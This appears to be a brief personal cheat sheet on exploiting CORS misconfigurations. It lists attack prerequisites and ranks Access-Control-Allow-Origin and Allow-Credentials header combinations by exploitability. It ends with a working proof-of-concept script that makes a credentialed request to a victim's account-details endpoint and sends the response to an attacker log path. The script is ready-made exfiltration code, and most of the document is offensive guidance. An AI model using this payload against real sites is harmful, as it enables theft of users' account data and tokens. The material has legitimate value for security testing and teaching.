To Kawili:
=================================================

Cross Origin Resource Sharing:

*Attack is initiated by the attacker
*No need to send or social engineer victim 
*Once CORS exploitability is validated, send the following XMLHttp request:

Pre-requisite of attack:
1. CORS misconfiguration (validated through burp or curl)
2. You have session cookie of the victim (or check if this is required) 
3. You know the URL which has CORS misconfiguration and will give you sensitive information like tokens etc 


Ways to exploit CORS:

POORLY IMPLEMENTED, BEST CASE FOR ATTACK:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

POORLY IMPLEMENTED, EXPLOITABLE:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

BAD IMPLEMENTATION BUT NOT EXPLOITABLE:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

or just

Access-Control-Allow-Origin: *



~~~~~~~~
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://victim/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script>
~~~~~~~~
